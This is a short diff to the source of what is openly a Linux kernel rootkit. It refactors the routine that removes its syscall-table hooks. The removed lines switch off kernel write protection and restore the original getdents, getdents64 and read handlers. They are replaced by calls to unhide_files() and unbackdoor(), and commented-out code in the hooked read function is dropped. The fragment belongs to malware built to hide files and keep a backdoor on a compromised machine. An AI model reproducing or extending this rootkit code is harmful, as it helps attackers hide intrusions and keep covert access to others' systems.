@@ -61,26 +61,11 @@ init_hooks(void)
 void
 remove_hooks(void)
 {
-    if (rootkit.hiding_files) {
-        while (atomic_read(&getdents_count) > 0);
-        disable_protection();
-        sys_calls[__NR_getdents] = (void *)sys_getdents;
-        enable_protection();
+    if (rootkit.hiding_files)
+        unhide_files();
 
-        while (atomic_read(&getdents64_count) > 0);
-        disable_protection();
-        sys_calls[__NR_getdents64] = (void *)sys_getdents64;
-        enable_protection();
-    }
-
-    if (rootkit.backdoor == BD_READ) {
-        while (atomic_read(&read_count) > 0);
-        disable_protection();
-        sys_calls[__NR_read] = (void *)sys_read;
-        enable_protection();
-    } else if (rootkit.backdoor == BD_TTY) {
-        disable_backdoor();
-    }
+    if (rootkit.backdoor != BD_OFF)
+        unbackdoor();
 }
 
 void
@@ -99,10 +84,6 @@ enable_protection(void)
 asmlinkage ssize_t
 g7_read(const struct pt_regs *pt_regs)
 {
-    /* unsigned fd = (unsigned)pt_regs->di; */
-    /* char *buf = (char *)pt_regs->si; */
-    /* size_t count = (size_t)pt_regs->dx; */
-
     return sys_read(pt_regs);
 }
 
